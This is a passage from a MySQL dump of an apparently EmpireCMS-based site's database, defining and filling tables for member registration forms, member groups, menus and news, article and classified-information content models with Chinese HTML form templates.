  `tobrf` text NOT NULL,
  `viewenter` text NOT NULL,
  `searchvar` varchar(255) NOT NULL DEFAULT '',
  `canaddf` text NOT NULL,
  `caneditf` text NOT NULL,
  `checkboxf` text NOT NULL,
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmemberform`
--

LOCK TABLES `libang_enewsmemberform` WRITE;
/*!40000 ALTER TABLE `libang_enewsmemberform` DISABLE KEYS */;
INSERT INTO `libang_enewsmemberform` VALUES (1,'个人注册表单','<table width=\\\'100%\\\' align=\\\'center\\\' cellpadding=3 cellspacing=1 bgcolor=\\\'#DBEAF5\\\'>\r\n<tr><td width=\\\'25%\\\' height=25 bgcolor=\\\'ffffff\\\'>真实姓名</td><td bgcolor=\\\'ffffff\\\'>[!--truename--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>QQ号码</td><td bgcolor=\\\'ffffff\\\'>[!--oicq--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>MSN</td><td bgcolor=\\\'ffffff\\\'>[!--msn--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>联系电话</td><td bgcolor=\\\'ffffff\\\'>[!--mycall--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>手机</td><td bgcolor=\\\'ffffff\\\'>[!--phone--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>网站地址</td><td bgcolor=\\\'ffffff\\\'>[!--homepage--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>会员头像</td><td bgcolor=\\\'ffffff\\\'>[!--userpic--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>联系地址</td><td bgcolor=\\\'ffffff\\\'>[!--address--]&nbsp;邮编: [!--zip--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>个人介绍</td><td bgcolor=\\\'ffffff\\\'>[!--saytext--]</td></tr>\r\n</table>','','真实姓名<!--field--->truename<!--record-->联系电话<!--field--->mycall<!--record-->手机<!--field--->phone<!--record-->QQ号码<!--field--->oicq<!--record-->MSN<!--field--->msn<!--record-->网站地址<!--field--->homepage<!--record-->会员头像<!--field--->userpic<!--record-->联系地址<!--field--->address<!--record-->邮编<!--field--->zip<!--record-->简介<!--field--->saytext<!--record-->','',',',',userpic,',',saytext,','真实姓名<!--field--->truename<!--record-->联系电话<!--field--->mycall<!--record-->手机<!--field--->phone<!--record-->QQ号码<!--field--->oicq<!--record-->MSN<!--field--->msn<!--record-->网站地址<!--field--->homepage<!--record-->会员头像<!--field--->userpic<!--record-->联系地址<!--field--->address<!--record-->邮编<!--field--->zip<!--record-->简介<!--field--->saytext<!--record-->','',',truename,mycall,phone,oicq,msn,homepage,userpic,address,zip,saytext,',',truename,mycall,phone,oicq,msn,homepage,userpic,address,zip,saytext,',','),(2,'企员注册表单','<table width=\\\'100%\\\' align=\\\'center\\\' cellpadding=3 cellspacing=1 bgcolor=\\\'#DBEAF5\\\'><tr><td width=\\\'25%\\\' height=25 bgcolor=\\\'ffffff\\\'>公司名称</td><td bgcolor=\\\'ffffff\\\'>[!--company--](*)</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>联系人</td><td bgcolor=\\\'ffffff\\\'>[!--truename--](*)</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>联系电话</td><td bgcolor=\\\'ffffff\\\'>[!--mycall--](*)</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>传真</td><td bgcolor=\\\'ffffff\\\'>[!--fax--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>手机</td><td bgcolor=\\\'ffffff\\\'>[!--phone--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>QQ号码</td><td bgcolor=\\\'ffffff\\\'>[!--oicq--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>MSN</td><td bgcolor=\\\'ffffff\\\'>[!--msn--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>网址</td><td bgcolor=\\\'ffffff\\\'>[!--homepage--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>会员头像</td><td bgcolor=\\\'ffffff\\\'>[!--userpic--]</td></tr>\r\n<tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>联系地址</td><td bgcolor=\\\'ffffff\\\'>[!--address--]&nbsp;邮编: [!--zip--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>公司介绍</td><td bgcolor=\\\'ffffff\\\'>[!--saytext--]</td></tr></table>','','公司名称<!--field--->company<!--record-->联系人<!--field--->truename<!--record-->联系电话<!--field--->mycall<!--record-->传真<!--field--->fax<!--record-->手机<!--field--->phone<!--record-->QQ号码<!--field--->oicq<!--record-->MSN<!--field--->msn<!--record-->网址<!--field--->homepage<!--record-->会员头像<!--field--->userpic<!--record-->联系地址<!--field--->address<!--record-->邮编<!--field--->zip<!--record-->公司介绍<!--field--->saytext<!--record-->',',company,truename,mycall,',',',',userpic,',',saytext,','公司名称<!--field--->company<!--record-->联系人<!--field--->truename<!--record-->联系电话<!--field--->mycall<!--record-->传真<!--field--->fax<!--record-->手机<!--field--->phone<!--record-->QQ号码<!--field--->oicq<!--record-->MSN<!--field--->msn<!--record-->网址<!--field--->homepage<!--record-->会员头像<!--field--->userpic<!--record-->联系地址<!--field--->address<!--record-->邮编<!--field--->zip<!--record-->公司介绍<!--field--->saytext<!--record-->',',company,',',company,truename,mycall,fax,phone,oicq,msn,homepage,userpic,address,zip,saytext,',',company,truename,mycall,fax,phone,oicq,msn,homepage,userpic,address,zip,saytext,',',');
/*!40000 ALTER TABLE `libang_enewsmemberform` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmembergbook`
--

DROP TABLE IF EXISTS `libang_enewsmembergbook`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmembergbook` (
  `gid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `isprivate` tinyint(1) NOT NULL DEFAULT '0',
  `uid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `uname` varchar(20) NOT NULL DEFAULT '',
  `ip` varchar(15) NOT NULL DEFAULT '',
  `addtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `gbtext` text NOT NULL,
  `retext` text NOT NULL,
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `eipport` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`gid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmembergbook`
--

LOCK TABLES `libang_enewsmembergbook` WRITE;
/*!40000 ALTER TABLE `libang_enewsmembergbook` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmembergbook` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmembergroup`
--

DROP TABLE IF EXISTS `libang_enewsmembergroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmembergroup` (
  `groupid` smallint(6) NOT NULL AUTO_INCREMENT,
  `groupname` varchar(60) NOT NULL DEFAULT '',
  `level` smallint(6) NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `favanum` smallint(6) NOT NULL DEFAULT '0',
  `daydown` int(11) NOT NULL DEFAULT '0',
  `msglen` int(11) NOT NULL DEFAULT '0',
  `msgnum` int(11) NOT NULL DEFAULT '0',
  `canreg` tinyint(1) NOT NULL DEFAULT '0',
  `formid` smallint(6) NOT NULL DEFAULT '0',
  `regchecked` tinyint(1) NOT NULL DEFAULT '0',
  `spacestyleid` smallint(6) NOT NULL DEFAULT '0',
  `dayaddinfo` smallint(6) NOT NULL DEFAULT '0',
  `infochecked` tinyint(1) NOT NULL DEFAULT '0',
  `plchecked` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`groupid`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmembergroup`
--

LOCK TABLES `libang_enewsmembergroup` WRITE;
/*!40000 ALTER TABLE `libang_enewsmembergroup` DISABLE KEYS */;
INSERT INTO `libang_enewsmembergroup` VALUES (1,'普通会员',1,0,120,0,255,50,1,1,0,1,0,0,0),(2,'VIP会员',2,0,200,0,255,120,0,1,0,1,0,0,0),(3,'企业会员',1,0,120,0,255,50,1,2,0,2,0,0,0),(4,'企业VIP会员',2,0,200,0,255,120,0,2,0,2,0,0,0);
/*!40000 ALTER TABLE `libang_enewsmembergroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmemberpub`
--

DROP TABLE IF EXISTS `libang_enewsmemberpub`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmemberpub` (
  `userid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `todayinfodate` char(10) NOT NULL DEFAULT '',
  `todayaddinfo` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `todaydate` char(10) NOT NULL DEFAULT '',
  `todaydown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `authstr` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmemberpub`
--

LOCK TABLES `libang_enewsmemberpub` WRITE;
/*!40000 ALTER TABLE `libang_enewsmemberpub` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmemberpub` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmenu`
--

DROP TABLE IF EXISTS `libang_enewsmenu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmenu` (
  `menuid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `menuname` varchar(60) NOT NULL DEFAULT '',
  `menuurl` varchar(255) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `addhash` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`menuid`),
  KEY `myorder` (`myorder`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmenu`
--

LOCK TABLES `libang_enewsmenu` WRITE;
/*!40000 ALTER TABLE `libang_enewsmenu` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmenu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmenuclass`
--

DROP TABLE IF EXISTS `libang_enewsmenuclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmenuclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(60) NOT NULL DEFAULT '',
  `issys` tinyint(1) NOT NULL DEFAULT '0',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classtype` tinyint(1) NOT NULL DEFAULT '0',
  `groupids` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`),
  KEY `myorder` (`myorder`),
  KEY `classtype` (`classtype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmenuclass`
--

LOCK TABLES `libang_enewsmenuclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsmenuclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsmenuclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmod`
--

DROP TABLE IF EXISTS `libang_enewsmod`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmod` (
  `mid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `mname` varchar(100) NOT NULL DEFAULT '',
  `mtemp` mediumtext NOT NULL,
  `mzs` varchar(255) NOT NULL DEFAULT '',
  `cj` mediumtext NOT NULL,
  `enter` mediumtext NOT NULL,
  `tempvar` mediumtext NOT NULL,
  `sonclass` text NOT NULL,
  `searchvar` varchar(255) NOT NULL DEFAULT '',
  `tid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `qenter` mediumtext NOT NULL,
  `mustqenterf` text NOT NULL,
  `qmtemp` mediumtext NOT NULL,
  `listandf` text NOT NULL,
  `setandf` tinyint(1) NOT NULL DEFAULT '0',
  `listtempvar` mediumtext NOT NULL,
  `qmname` varchar(30) NOT NULL DEFAULT '',
  `canaddf` text NOT NULL,
  `caneditf` text NOT NULL,
  `definfovoteid` smallint(6) NOT NULL DEFAULT '0',
  `showmod` tinyint(1) NOT NULL DEFAULT '0',
  `usemod` tinyint(1) NOT NULL DEFAULT '0',
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  `orderf` text NOT NULL,
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `listfile` varchar(30) NOT NULL DEFAULT '',
  `printtempid` smallint(6) NOT NULL DEFAULT '0',
  `maddfun` varchar(255) NOT NULL DEFAULT '',
  `meditfun` varchar(255) NOT NULL DEFAULT '',
  `qmaddfun` varchar(255) NOT NULL DEFAULT '',
  `qmeditfun` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`mid`),
  KEY `tid` (`tid`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmod`
--

LOCK TABLES `libang_enewsmod` WRITE;
/*!40000 ALTER TABLE `libang_enewsmod` DISABLE KEYS */;
INSERT INTO `libang_enewsmod` VALUES (1,'新闻系统模型','<table width=\\\'100%\\\' align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\"><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题(*)</td><td bgcolor=\\\'ffffff\\\'>[!--title--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>副标题</td><td bgcolor=\\\'ffffff\\\'>[!--ftitle--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>特殊属性</td><td bgcolor=\\\'ffffff\\\'>[!--special.field--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>发布时间</td><td bgcolor=\\\'ffffff\\\'>[!--newstime--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题图片</td><td bgcolor=\\\'ffffff\\\'>[!--titlepic--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>内容简介</td><td bgcolor=\\\'ffffff\\\'>[!--smalltext--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>作者</td><td bgcolor=\\\'ffffff\\\'>[!--writer--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>信息来源</td><td bgcolor=\\\'ffffff\\\'>[!--befrom--]</td></tr><tr><td height=25 colspan=2 bgcolor=\\\'ffffff\\\'><div align=left>新闻正文(*)</div></td></tr></table><div style=\\\"background-color:#D0D0D0\\\">[!--newstext--]</div>','新闻系统模型','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->特殊属性<!--field--->special.field<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->顶<!--field--->diggtop<!--record-->','|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|26|',',title,smalltext,',1,'news','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->特殊属性<!--field--->special.field<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->',',title,newstext,','<table width=100% align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\"><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题(*)</td><td bgcolor=\\\'ffffff\\\'>[!--title--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>副标题</td><td bgcolor=\\\'ffffff\\\'>[!--ftitle--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>关键字</td><td bgcolor=\\\'ffffff\\\'>[!--special.field--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题图片</td><td bgcolor=\\\'ffffff\\\'>[!--titlepic--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>内容简介</td><td bgcolor=\\\'ffffff\\\'>[!--smalltext--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>作者</td><td bgcolor=\\\'ffffff\\\'>[!--writer--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>信息来源</td><td bgcolor=\\\'ffffff\\\'>[!--befrom--]</td></tr><tr><td height=25 colspan=2 bgcolor=\\\'ffffff\\\'><div align=left>新闻正文(*)</div></td></tr></table><div style=\\\"background-color:#D0D0D0\\\">[!--newstext--]</div>','',0,'标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->顶<!--field--->diggtop<!--record-->','新闻',',title,ftitle,newstime,titlepic,smalltext,writer,befrom,newstext,',',title,ftitle,newstime,titlepic,smalltext,writer,befrom,newstext,',0,0,0,0,'',1,'',0,'','','',''),(7,'文章系统模型','<table width=\\\'100%\\\' align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\"><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题(*)</td><td bgcolor=\\\'ffffff\\\'>[!--title--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>副标题</td><td bgcolor=\\\'ffffff\\\'>[!--ftitle--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>特殊属性</td><td bgcolor=\\\'ffffff\\\'>[!--special.field--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>发布时间</td><td bgcolor=\\\'ffffff\\\'>[!--newstime--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题图片</td><td bgcolor=\\\'ffffff\\\'>[!--titlepic--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>内容简介</td><td bgcolor=\\\'ffffff\\\'>[!--smalltext--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>作者</td><td bgcolor=\\\'ffffff\\\'>[!--writer--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>信息来源</td><td bgcolor=\\\'ffffff\\\'>[!--befrom--]</td></tr><tr><td height=25 colspan=2 bgcolor=\\\'ffffff\\\'><div align=left>新闻正文(*)</div></td></tr></table><div style=\\\"background-color:#D0D0D0\\\">[!--newstext--]</div>','','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->特殊属性<!--field--->special.field<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->顶<!--field--->diggtop<!--record-->','|55|56|57|',',title,smalltext,',7,'article','标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->特殊属性<!--field--->special.field<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->作者<!--field--->writer<!--record-->信息来源<!--field--->befrom<!--record-->新闻正文<!--field--->newstext<!--record-->',',title,newstext,','<table width=100% align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\"><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题(*)</td><td bgcolor=\\\'ffffff\\\'>[!--title--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>副标题</td><td bgcolor=\\\'ffffff\\\'>[!--ftitle--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>关键字</td><td bgcolor=\\\'ffffff\\\'>[!--special.field--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>标题图片</td><td bgcolor=\\\'ffffff\\\'>[!--titlepic--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>内容简介</td><td bgcolor=\\\'ffffff\\\'>[!--smalltext--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>作者</td><td bgcolor=\\\'ffffff\\\'>[!--writer--]</td></tr><tr><td width=\\\'16%\\\' height=25 bgcolor=\\\'ffffff\\\'>信息来源</td><td bgcolor=\\\'ffffff\\\'>[!--befrom--]</td></tr><tr><td height=25 colspan=2 bgcolor=\\\'ffffff\\\'><div align=left>新闻正文(*)</div></td></tr></table><div style=\\\"background-color:#D0D0D0\\\">[!--newstext--]</div>','',0,'标题<!--field--->title<!--record-->副标题<!--field--->ftitle<!--record-->发布时间<!--field--->newstime<!--record-->标题图片<!--field--->titlepic<!--record-->内容简介<!--field--->smalltext<!--record-->顶<!--field--->diggtop<!--record-->','文章',',title,ftitle,newstime,titlepic,smalltext,writer,befrom,newstext,',',title,ftitle,newstime,titlepic,smalltext,writer,befrom,newstext,',0,0,0,0,'',1,'',0,'','','',''),(8,'分类信息系统模型','<table width=100% align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\"><tr><td width=16% height=25 bgcolor=ffffff>标题</td><td bgcolor=ffffff>[!--title--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>特殊属性</td><td bgcolor=ffffff>[!--special.field--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>发布时间</td><td bgcolor=ffffff>[!--newstime--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>信息内容</td><td bgcolor=ffffff>[!--smalltext--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>图片</td><td bgcolor=ffffff>[!--titlepic--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>所在地</td><td bgcolor=ffffff>[!--myarea--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>联系邮箱</td><td bgcolor=ffffff>[!--email--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>联系方式</td><td bgcolor=ffffff>[!--mycontact--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>联系地址</td><td bgcolor=ffffff>[!--address--]</td></tr></table>','','标题<!--field--->title<!--record-->发布时间<!--field--->newstime<!--record-->信息内容<!--field--->smalltext<!--record-->图片<!--field--->titlepic<!--record-->所在地<!--field--->myarea<!--record-->联系邮箱<!--field--->email<!--record-->联系方式<!--field--->mycontact<!--record-->联系地址<!--field--->address<!--record-->','标题<!--field--->title<!--record-->特殊属性<!--field--->special.field<!--record-->发布时间<!--field--->newstime<!--record-->信息内容<!--field--->smalltext<!--record-->图片<!--field--->titlepic<!--record-->所在地<!--field--->myarea<!--record-->联系邮箱<!--field--->email<!--record-->联系方式<!--field--->mycontact<!--record-->联系地址<!--field--->address<!--record-->','标题<!--field--->title<!--record-->发布时间<!--field--->newstime<!--record-->信息内容<!--field--->smalltext<!--record-->图片<!--field--->titlepic<!--record-->所在地<!--field--->myarea<!--record-->联系邮箱<!--field--->email<!--record-->联系方式<!--field--->mycontact<!--record-->联系地址<!--field--->address<!--record-->','|11|12|13|14|15|16|18|19|20|21|23|24|25|26|28|29|30|31|',',title,smalltext,myarea,',8,'info','标题<!--field--->title<!--record-->信息内容<!--field--->smalltext<!--record-->图片<!--field--->titlepic<!--record-->所在地<!--field--->myarea<!--record-->联系邮箱<!--field--->email<!--record-->联系方式<!--field--->mycontact<!--record-->联系地址<!--field--->address<!--record-->',',title,smalltext,myarea,email,','<table width=100% align=center cellpadding=3 cellspacing=1 class=\\\"tableborder\\\"><tr>\r\n    <td width=16% height=25 bgcolor=ffffff>信息标题(*)</td>\r\n    <td bgcolor=ffffff>[!--title--]</td></tr><tr>\r\n    <td width=16% height=25 bgcolor=ffffff>信息内容(*)</td>\r\n    <td bgcolor=ffffff>[!--smalltext--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>图片</td><td bgcolor=ffffff>[!--titlepic--]</td></tr><tr>\r\n    <td width=16% height=25 bgcolor=ffffff>所在地(*)</td>\r\n    <td bgcolor=ffffff>[!--myarea--]</td></tr><tr>\r\n    <td width=16% height=25 bgcolor=ffffff>联系邮箱(*)</td>\r\n    <td bgcolor=ffffff>[!--email--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>联系方式</td><td bgcolor=ffffff>[!--mycontact--]</td></tr><tr><td width=16% height=25 bgcolor=ffffff>联系地址</td><td bgcolor=ffffff>[!--address--]</td></tr></table>',',myarea,',0,'标题<!--field--->title<!--record-->发布时间<!--field--->newstime<!--record-->信息内容<!--field--->smalltext<!--record-->图片<!--field--->titlepic<!--record-->所在地<!--field--->myarea<!--record-->','分类信息',',title,newstime,smalltext,titlepic,myarea,email,mycontact,address,',',title,newstime,smalltext,titlepic,myarea,email,mycontact,address,',0,0,0,0,'',1,'',0,'','','','');
/*!40000 ALTER TABLE `libang_enewsmod` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsmoreport`
--

DROP TABLE IF EXISTS `libang_enewsmoreport`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsmoreport` (
  `pid` int(11) NOT NULL AUTO_INCREMENT,
  `pname` char(60) NOT NULL DEFAULT '',
  `purl` char(255) NOT NULL DEFAULT '',
  `ppath` char(255) NOT NULL DEFAULT '',
  `postpass` char(120) NOT NULL DEFAULT '',
  `postfile` char(255) NOT NULL DEFAULT '',
  `tempgid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `mustdt` tinyint(1) NOT NULL DEFAULT '0',
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `closeadd` tinyint(1) NOT NULL DEFAULT '0',
  `headersign` char(255) NOT NULL DEFAULT '',
  `openadmin` tinyint(1) NOT NULL DEFAULT '0',
  `rehtml` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`pid`),
  KEY `isclose` (`isclose`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsmoreport`
--

LOCK TABLES `libang_enewsmoreport` WRITE;
/*!40000 ALTER TABLE `libang_enewsmoreport` DISABLE KEYS */;
INSERT INTO `libang_enewsmoreport` VALUES (1,'主访问端','','','','',0,0,0,0,'',0,0);
/*!40000 ALTER TABLE `libang_enewsmoreport` ENABLE KEYS */;
UNLOCK TABLES;

--
